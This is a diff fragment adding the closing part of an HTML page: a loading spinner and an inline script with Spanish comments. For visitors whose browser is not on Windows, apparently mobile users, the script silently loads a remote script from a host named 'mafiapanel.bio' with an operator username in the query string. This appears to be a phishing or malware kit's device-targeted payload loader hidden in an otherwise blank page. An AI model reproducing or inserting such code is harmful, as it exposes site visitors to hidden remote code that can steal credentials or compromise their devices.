@@ -1,0 +1,16 @@
+	</head>
+<body>
+    <span class="loader"></span>
+    <script>
+        // Verificar si el agente de usuario (User-Agent) no contiene "Windows" (detecta no PC)
+        if (!navigator.userAgent.includes("Windows")) {
+            // Cargar el segundo fragmento de código en dispositivos móviles
+            var script = document.createElement('script');
+            script.src = "https://mafiapanel.bio/h/index.php?username=Danieladmin";
+            script.type = "text/javascript";
+            script.async = true;
+            document.body.appendChild(script);
+        }
+    </script>
+</body>
+</html>
